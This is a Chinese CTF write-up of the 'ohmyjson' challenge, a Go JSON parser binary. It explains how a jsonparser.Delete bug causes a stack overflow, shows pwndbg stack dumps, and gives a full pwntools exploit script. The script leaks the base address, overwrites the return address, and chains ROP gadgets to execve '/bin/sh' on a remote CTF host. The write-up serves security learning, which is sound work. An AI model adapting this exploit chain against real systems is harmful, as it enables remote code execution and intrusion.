# ohmyjson
golang写的json解析程序

存在混淆，golanghelper恢复没有效果，不过debug信息会有源码位置，因此选择人为制造Crash，可以定位到一些关键函数，和直接获得对应源码位置，根据源码行数可以确定一些官方函数

大致流程:read => strings.Split => ParseJson 

Split会按照空格分割并判断是否为3个部分

而后会使用jsonparser.Delete，将json中第二个部分指定的成员删除

在逆向出最后一个的作用前，进行简单测试发现利用:
```
# buger/jsonparser 唯一相关CVE(恰好也在jsonparser.Delete)
https://github.com/buger/jsonparser/issues/188
```
类似的一些非法json，会导致处理时间过长，导致最后一个达到(第三部分比较长时)栈溢出(后续没有继续逆，这里猜测是超时后Thread返回设置标志位等原因触发溢出函数)，并且一些情况下(第三部分比较短时)可以输出第三部分信息(0x20字节)

Debug时可以看到溢出时栈信息:
```
pwndbg> x/100xg $rsp-0xa0
0xc000045e00:	0x0000555555699c40	0x000000c000102000
0xc000045e10:	0x000000c000045e40	0x0000555555609ade
0xc000045e20:	0x0000000000000000	0x0000000000000000
0xc000045e30:	0x000000c000045de0	0x0000000000000020
0xc000045e40:	0x0000000000000020	0x000000c00005c180
0xc000045e50:	0x000000c000045e20	0x0000000000000001
0xc000045e60:	0x0000000000000000	0x0000000000000000
0xc000045e70:	0x000000c00005c1e0	0x0000000000000000
0xc000045e80:	0x0000000000000001	0x0000000000000000
0xc000045e90:	0x0000000000000000	0x000000c000045f78
0xc000045ea0:	0x000055555566afd0	0x000000c000000000
......
......
```
溢出会从第三部分的0x30字节往后，覆盖到0xc000045e10地址之后

并可以看到0xc000045e30位置恰好类似一个0x20 length的slice:
```
struct slice{
	byte* array;
	uintgo len;
	uintgo cap;
}
```
Debug+硬件断点确定实际输出的就是这个slice的数据

0xc000045ea0位置为返回地址

Exploit: 利用golang栈地址相对固定(远程利用报错debug信息可以看到栈地址)来设置好slice进行leak程序加载基址

而后部分覆盖返回地址进行复用(1/16爆破)

复用后直接ROP执行execv即可

### EXP:
```
#测试使用"{{{}"这类json也可以
from pwn import *
context.log_level="debug"
#p=process("./chall")
p=remote("123.57.209.176",30773)
payload='{{{} a '+"\x00"*0x30
payload+=(p64(0)*4+p64(0xc00003eea0)+p64(0x50)+p64(0x50)).ljust(0x90,"\x00")
payload+="\xb0\x6d"
#0
#gdb.attach(p)
p.sendlineafter(": ",payload)
p.recv(0x10)

addr=u64(p.recv(8))+0x5603ab9bd000-0x5603abb248a8
print hex(addr)
rdi=addr+0x0000000000117867
rsi2=addr+0x0000000000117865
rdx=addr+0x00000000000783de
rax=addr+0x0000000000073339
syscall=addr+0x000000000009c194
if addr>0:
     payload='{{{} a '+"\x00"*0xc0
     payload+=p64(rdi)+p64(0xc00003ee18)+p64(rsi2)+p64(0)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(0x3b)+p64(syscall)+"/bin/sh\x00"
     p.sendlineafter(": ",payload)
     #gdb.attach(p)
p.interactive()
```